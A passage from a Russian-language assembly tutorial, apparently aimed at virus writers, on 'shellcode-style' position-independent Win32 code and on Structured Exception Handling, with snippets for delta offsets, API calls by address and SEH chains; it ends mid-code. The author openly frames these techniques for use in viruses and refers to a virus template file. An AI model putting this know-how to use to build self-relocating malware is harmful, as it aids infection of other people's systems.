&nbsp;</div>
<p>Пример Закончен.</p>
<p>Этот код означает следующее - если значение в регистре EAX равно нулю, то делается дальний переход на адрес, который находиться в EDI.</p>
<p>При программировании в shell-код стиле полезно пользоваться процедурами, т.к. в них можно использовать локальные переменные и они базово-независимы в принципе, т.к. используют стек. Но здесь возникает небольшой вопрос - где хранить дельта-смещение? Вопрос возникает потому, что мы обычно храним дельта-смещение  в регистре EBP. В процедурах, регистр EBP используется для своего первоначального предназначения - хранить базу кадра стека. Здесь можно пофантазировать. Я использовал локальную переменную для хранения дельта-смещения.</p>
<p>Директивы компилятора .IF,.WHILE и т.д. Вы можете применять без особых проблем, т.к. у нас всего один сегмент. В случае этих директив компилятор генерирует код, в который входят только относительные адреса.</p>
<p>API-функции мы будем вызывать по абсолютным адресам, для чего мы и получили их адреса. В итоге, первоначальный код, который мы решили перевести в код в Shell-код стиле превращается в такой:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; MB_OK<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span> offset Title1<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span> offset Text1<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>_MessageBox<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>IF &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span>==<span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> error<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>ENDIF<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br />
error<span style="color: #339933;">:</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>В команде jmp error также используется относительный переход. По умолчанию в JMP в MASM'е трактуется как прямой внутрисегментный переход.</p>
<p>При программировании удобно использовать макросы. Посмотрите пример</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">api macro x<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>x<span style="color: #339933;">-</span>delta<span style="color: black;">&#93;</span><br />
endm<br />
&nbsp;</div>
<p>А вот так это можно использовать:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">api _MessageBox</div>
<p>Пример Закончен.</p>
<h3><a name="c32"></a>Обобщенный пример программирования в Shell-код стиле</h3>
<p>В этом разделе я хотел привести нормальную программу, а потом эту же программу, но в Shell-код стиле. Но потом я передумал :) Код той и другой программы находятся в архиве, который прилагается к статье. Итак, программа рекурсивного поиска. Программа выводит на экран с помощью MessageBox'а количество найденных файлов с расширением EXE в указанной директории и всех ее поддиректориях. Файлы ищутся в директории, имя которой находиться по адресу Buffer. В архиве есть папка, которая называется ShellCoded. В ней нормальная программа называется - normal.asm, в Shell-код стиле - shellcode.asm. Внимательно рассмотрите эти программы и попробуйте их сравнить. Также потренируйтесь переводить свои программы таким же образом.</p>
<p>Т.о. Вы можете переводить обычное Win32-приложение в приложение в shell-код стиле. Во вложении к статье я также предлагаю Вам шаблон файла, где Вам не придется получать дельта смещение и адреса API-функций. Там уже все есть как в сказке! Почти всё ;) Файл называется VXTemplateWin32.asm.</p>
<h2><a name="c4"></a>Важные техники системного программирования</h2>
<h3><a name="c41"></a>Structured Exception Handling</h3>
<h4><a name="c411"></a>Введение</h4>
<p>Structured Exception Handling (SEH) - структурная обработка исключений, механизм, который поддерживается операционной системой и позволяющий обрабатывать ошибки в программах. В этом разделе я расскажу Вам, что такое SEH, как работает данный механизм и как его использовать в своих вирусах.</p>
<p>SEH - это системный механизм. Представьте, что Ваша программа попытается выполнить следующий код:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Записываем по адресу 0 - единицу.</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>Любое обращение к адресам от 0 до 0FFFFh ведет к исключению нарушения доступа к памяти. Конечно, ошибка нарушения доступа к памяти появляется не только для этих адресов, но и для всех адресов выше 2х Гб в виртуальном адресном пространстве, а также если мы пытаемся обратиться к не переданным страницам или например, произвести запись к странице к которой мы не имеем право на запись.</p>
<p>Исключение - это событие, которое происходит в результате какой-либо ошибки.  Каждое исключение имеет свой код. Например, код неправомерного доступа к памяти - 0C0000005h. Коды исключений определены в файле WINBASE.H. Допустим, выполняется пример кода, когда мы записываем 1 по адресу 0, тогда возникает исключение. ОС должна реагировать на исключение.  Обычно при возникновении исключения ОС вызывает функцию, которая называется обработчиком исключений (exception handler). Эта функция - обычная CALLBACK-функция принимающая несколько параметров. Если мы обрабатываем это исключение, то мы пишем обработчик и в определенном месте указываем его адрес, чтобы, если произошло исключение, ОС смогла вызвать наш обработчик.  Если обработчик выполнился, ОС решает, что дальше делать исходя из возвращаемого значения, которой вернул  обработчик. Исходя из этих соображений, программа может продолжить работу, программа может завершиться или ОС вызывает следующий обработчик в цепочке (если таковой имеется). Т.е. можно устанавливать несколько обработчиков. Если мы сами не установили обработчик, то в любом приложении установлен обработчик по умолчанию и если случиться исключение, то ОС выведет сообщение о завершении программы.</p>
<div align="center">
	<img src="img/vbp01/fig31.jpg" alt="" />
</div>
<p>Если на участок кода приведенном в примере установлен обработчик, то мы можем обработать эту ошибку с помощью специально написанного обработчика. Существует два типа обработчиков исключений - конечные и внутри-поточные. Итак...</p>
<h4><a name="c412"></a>Конечный обработчик</h4>
<p>Если программа вызвала исключение, то, если внутри-поточные обработчики не установлены или не обрабатывают исключение, вызывается конечный обработчик. Конечный обработчик глобален для процесса, в котором он установлен, в отличии от внутри-поточного. Конечный обработчик устанавливается с помощью API-функции KERNEL32.DLL!SetUnhandledExceptionFilter. Как Вы заметили :) она экспортируется из kernel32.dll. С помщью этой функции можно установить конечный обработчик. Если в Вашей программе произошло исключение и его не обрабатывают никакие внутри-поточные обработчики, то вызывается конечный обработчик. Конечный обработчик вызывается как раз перед тем, когда ОС решила закрыть приложение. Смещение конечного обработчика передается как параметр функции KERNEL32.DLL!SetUnhandledExceptionFilter.</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">Handler proc EXCEPT<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><span style="color: black; font-style: italic;">; здесь обрабатываем ошибочку</span><br />
<span style="color: #00007f; font-weight: bold;">ret</span><br />
Handler endp<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">........</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Handler<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>_SetUnhandledExceptionFilter<span style="color: black;">&#93;</span><span style="color: black; font-style: italic;">;установка конечного обработчика</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">....</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; защищенный код. Если здесь будет исключение, </span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; то вызовется функция по адресу Handler</span><br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>Функция-обработчик такой прототип прототип:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">LONG UnhandledExceptionFilter<span style="color: black;">&#40;</span> STRUCT _EXCEPTION_POINTERS <span style="color: #339933;">*</span>ExceptionInfo<span style="color: black;">&#41;</span><span style="color: black; font-style: italic;">;</span></div>
<p>Прототип этой функции я взял из SDK. Также там описаны и возвращаемые значения этой функции. А возвращаемые значения могут быть такие:</p>
<ul>
	<li>eax = -1 - перегрузить контекст и продолжить</li>
	<li>eax = 1 - выключает вывод Message Box'а</li>
	<li>eax = 0 - включает вывод Message Box'а</li>
</ul>
<p>Прототип конечного обработчика отличается от прототипа внутри-поточного обработчика.</p>
<p>Если что-то произошло в коде вируса, то надо просто перепрыгнуть на нормальный код программы, если этот код внедрен в программу и выполняется до ее старта. Если код вируса выполняется в потоке, то мы завершаем поток. Конечно, можно попробовать  исправить ошибку, и продолжить выполнение.</p>
<h4><a name="c413"></a>Внутри-поточный обработчик</h4>
<p>Если мы хотим обрабатывать ошибки для каждого потока, т.е. устанавливать свой обработчик для каждого вида ошибок в потоке, то мы должны установить внутри-поточный обработчик. Например, ошибка нарушения доступа к памяти в одном потоке будет обрабатываться по-своему, а в другом потоке та же ошибка, уже по-другому, в зависимости от обработчика. Из внутри-поточных обработчиков можно делать цепочки. Т.е. если один обработчик не обрабатывает исключение, то исключение может обработать следующий обработчик в цепочке.</p>
<p>По адресу FS:[0] находиться указатель на структуру SEH, ее называют SEH-фрейм.</p>
<p>Вот описание этой структуры:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">SEH struct<br />
&nbsp; &nbsp; &nbsp; &nbsp; PrevLink&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; адрес предыдущего SEH-фрейма</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; CurrentHandler&nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; адрес обработчика исключений</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; SafeOffset&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; Смещение безопасного места</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PrevEsp &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; Старое значение esp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PrevEbp &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; Старое значение ebp</span><br />
SEH ends<br />
&nbsp;</div>
<p>Когда мы устанавливаем обработчик исключения вручную, то мы заполняем структуру SEH и передаем указатель на нее в FS:[0]. Структура SEH должна состоять как минимум из 2-х первых двойных слов. Эта новая созданная структура должна обязательно находиться в стеке, иначе наш обработчик не будет вызван. Более того, очередная новая созданная структура должна находиться в стеке выше, чем предыдущие установленные структуры.</p>
<p>Вот как можно установить внутри-поточный обработчик:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span>Handler<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;В edx - дельта смещение</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Формируем структуру SEH</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">FS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Формируем структуру SEH</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">FS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ESP</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Защищенный код</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">FS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Восстанавливаем в FS:[0] адрес предыдущей структуры SEH</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESP</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;убираем из стека оставшийся адрес обработчика из структуры</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br />
Handler proc ExcRec<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> SehFrame<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> Context<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> DispatcherContext<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
Handler endp<br />
&nbsp;</div>
<p>Пример Закончен.</p>
<p>Когда поток начинает только выполняться, у него уже установлен один обработчик, обработчик по умолчанию, который выводит сообщение о завершении программы.</p>
<p>Если присмотреться внимательно, то можно понять, что вышеприведенным кодом добавляется очередной элемент в связный список. По адресу FS:[0] содержится указатель на структуру SEH, в которой имеется адрес предыдущей структуры SEH в стеке. Этот связный список называется SEH-цепочка (SEH-chain). Так формируется цепочка из обработчиков исключений. Сцепление в цепочку обработчиков делается, например для того, чтобы каждый обработчик в цепочке обрабатывал свои типы исключений. Если первый обработчик не обработал исключение, то он возвращает eax=1 и управление передается следующему обработчику в цепочке. Т.е. если обработчик возвращает 1, то ОС переходит к следующему элементу в цепочке. Также для каждого куска кода может быть свой обработчик. Если данный обработчик - последний в цепочке, то у него указатель на предыдущий обработчик (поле PrevLink) будет равен -1. Чтобы точно понять, что же такое цепочка из внутри-поточных обработчиков посмотрите на рисунок:</p>
<div align="center">
	<img src="img/vbp01/fig32.gif" alt="" />
</div>
<p>При вызове внутри-поточного обработчика ОС использует Си-договоренность о передаче параметров, вместо стандартной договоренности, т.е. стек после вызова, вызывающий код, должен сам уравнивать, что ОС и делает.</p>
<p>Прототип внутри-поточного обработчика имеет вид</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">EXCEPTION_DISPOSITION __cdecl _except_handler <span style="color: black;">&#40;</span><br />
&nbsp; &nbsp; <span style="color: #993333;">struct</span> _EXCEPTION_RECORD <span style="color: #339933;">*</span>ExceptionRecord<span style="color: #339933;">,</span><br />
&nbsp; &nbsp; <span style="color: #993333;">void</span> <span style="color: #339933;">*</span> EstablisherFrame<span style="color: #339933;">,</span><span style="color: black; font-style: italic;">//указатель на структуру SEH</span><br />
&nbsp; &nbsp; <span style="color: #993333;">struct</span> _CONTEXT <span style="color: #339933;">*</span>ContextRecord<span style="color: #339933;">,</span><span style="color: black; font-style: italic;">//Указатель на структуру CONTEXT</span><br />
&nbsp; &nbsp; <span style="color: #993333;">void</span> <span style="color: #339933;">*</span> DispatcherContext<br />
&nbsp; &nbsp; <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
&nbsp;</div>
<p>Обработчик имеет доступ к структуре EXCEPTION_RECORD, которая содержит подробную информацию о исключении. С помощью адреса структуры SEH можно получить доступ к локальным переменным, т.к. структура SEH находится в стеке. Из структуры CONTEXT можно получить значения всех регистров, которые они имели во время возникновения исключения. Структуру CONTEXT также можно редактировать, чтобы исправить ошибку и продолжить выполнение программы. Параметр DispatcherContext обычно не используется.</p>
<p>В заключение этого раздела приведу значения, которые могут возвращать конечный обработчик:</p>
<ul>
	<li>eax = 1 - ОС вызывает следующий обработчик в цепочке</li>
	<li>eax = 0 - перезагружаем контекст и продолжаем</li>
</ul>
<h4><a name="c414"></a>Продолжение выполнения с безопасного места</h4>
<p>Внутри-поточный обработчик</p>
<p>Когда мы просто прыгаем на безопасное место из обработчика, мы не сохраняем никакие регистры, кроме регистра EIP. Например, регистры ESP, EBP не сохраняются. Именно поэтому такой способ - "грязный". Есть техника позволяющая сохранять регистры, а также иметь доступ к локальным данным. Для этого нужно написать соответствующий обработчик. Используя эту технику можно исправить ошибку и продолжить выполнение с безопасного места. Вот маленькая программа, где используется техника продолжения выполнения с безопасного места:</p>
<p>Пример:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">.</span>386p<br />
<span style="color: #339933;">.</span>model <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>stdcall<br />
option casemap<span style="color: #339933;">:</span>none<br />
<span style="color: black; font-style: italic;">;----------------------IncludeLib and Include---------------------</span><br />
includelib \tools\masm32\lib\user32<span style="color: #339933;">.</span>lib<br />
includelib \tools\masm32\lib\kernel32<span style="color: #339933;">.</span>lib<br />
includelib \tools\masm32\lib\gdi32<span style="color: #339933;">.</span>lib<br />
includelib \tools\masm32\lib\advapi32<span style="color: #339933;">.</span>lib<br />
include \tools\masm32\include\windows<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
include \Tools\masm32\include\proto<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
include \tools\masm32\include\user32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
include \tools\masm32\include\kernel32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
include \tools\masm32\include\gdi32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
include \tools\masm32\include\advapi32<span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">inc</span><br />
<span style="color: black; font-style: italic;">;----------------------End IncludeLib and Include-----------------</span><br />
SEH struct<br />
&nbsp; &nbsp; &nbsp; &nbsp; PrevLink&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; адрес предыдущего SEH-фрейма</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; CurrentHandler&nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; адрес обработчика исключений</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; SafeOffset&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; Смещение безопасного места</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PrevEsp &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; Старое значение esp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; PrevEbp &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?&nbsp; &nbsp; <span style="color: black; font-style: italic;">; Старое значение ebp</span><br />
SEH ends<br />
<br />
<span style="color: #0000ff; font-weight: bold;">.data</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; seh <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;In SEHHanlder&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; seh1 <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;After Exception SEHHanlder&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
<span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br />
<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">fs</span><span style="color: #339933;">:</span>nothing<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset Next<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> offset SEHHandler <br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">FS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">FS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ESP</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;здесь начинается защищенный код</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">FS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><span style="color: black; font-style: italic;">;Восстанавливаем в FS:[0] адрес предыдущей структуры ERR</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">ESP</span><span style="color: #339933;">,</span><span style="color: #ff0000;">16</span><span style="color: black; font-style: italic;">;убираем из стека оставшийся адрес обработчика из структуры</span><br />
Next<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke MessageBox<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>offset seh1<span style="color: #339933;">,</span>offset seh1<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; invoke ExitProcess<span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
SEHHandler proc uses <span style="color: #46aa03; font-weight: bold;">edx</span> pExcept<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> pFrame<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> pContext<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><span style="color: #339933;">,</span> pDispatch<span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">DWORD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span>pFrame<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">:</span>ptr SEH<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>pContext<br />
&nbsp; &nbsp; &nbsp; &nbsp; assume <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">:</span>ptr CONTEXT<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>SafeOffset<br />
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">.</span>regEip<br />
